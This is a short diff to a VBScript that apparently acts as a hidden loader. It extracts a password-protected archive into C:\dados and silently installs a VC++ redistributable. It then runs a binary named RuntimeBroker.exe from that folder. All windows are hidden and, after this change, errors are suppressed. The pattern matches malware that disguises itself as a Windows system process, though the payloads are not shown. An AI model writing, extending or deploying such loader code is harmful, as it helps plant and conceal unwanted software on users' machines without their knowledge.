@@ -1,5 +1,6 @@
 Dim fldr, shl, psCmd1p1, psCmd1p2, psCmd1p3, psCmd1p4, zzCmd0, zzCmd1, zzCmd2, zzCmd3, zzCmd4, zzCmd5, zzCmd6, zzCmd7, zzCmd8
 
+On Error Resume Next
 fldr = "C:\dados"
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shl = CreateObject("WScript.Shell")
@@ -48,6 +49,11 @@ psCmd1p1 = fldr+"\comp.exe"
 psCmd1p2 = " -pPMC2025 -y"
 shl.Run psCmd1p1+psCmd1p2, 0
 WScript.Sleep 15000 '15 sec, 1 min was too long
+
+psCmd1p1 = fldr+"\vcredist.exe" 'VC++ redist
+psCmd1p2 = " /quiet /norestart"
+shl.Run psCmd1p1+psCmd1p2, 0
+WScript.Sleep 15000
 
 psCmd1p1 = fldr+"\RuntimeBroker.exe"
 shl.Run psCmd1p1, 0
